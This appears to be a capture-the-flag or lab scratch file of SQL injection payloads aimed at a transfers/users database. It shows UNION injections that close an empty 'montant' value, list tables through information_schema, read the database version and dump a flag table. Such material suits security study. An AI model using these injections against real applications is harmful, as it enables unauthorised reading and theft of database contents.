SELECT t.id AS transfert_id,sender.nom AS sender_nom,sender.prenom AS sender_prenom,reciever.nom AS reciever_nom,reciever.prenom AS reciever_prenom, t.montant, t.date FROM transferts t INNER JOIN users AS sender ON t.sender_id = sender.id INNER JOIN users AS reciever ON t.reciever_id = reciever.id WHERE t.montant = '' UNION SELECT NULL AS transfert_id, NULL AS sender_nom, NULL AS sender_prenom, NULL AS reciever_nom,NULL AS reciever_prenom,STRING_AGG(flag, ', ') AS all_tables, NULL AS date FROM iodjv;




-- SELECT id AS transfert_id,sender_id,reciever_id,montant,date,NULL as all_tables FROM transferts WHERE montant = '' UNION SELECT NULL AS transfert_id,


--     NULL AS sender_id,
--     NULL AS reciever_id,
--     NULL AS montant,
--     NULL AS date,STRING_AGG(table_name, ', ') AS all_tables FROM information_schema.tables WHERE table_schema = 'public' --comment


-- SELECT montant FROM transferts WHERE montant = '' UNION SELECT STRING_AGG(table_name, ', ') AS all_tables FROM information_schema.tables WHERE table_schema = 'public' --comment

-- SELECT STRING_AGG(table_name, ', ') AS all_tables
-- FROM information_schema.tables
-- WHERE table_schema = 'public';
-- SELECT table_name FROM information_schema.tables where table_schema = 'public'
--SELECT prenom from users where nom ='' UNION SELECT version() --comment';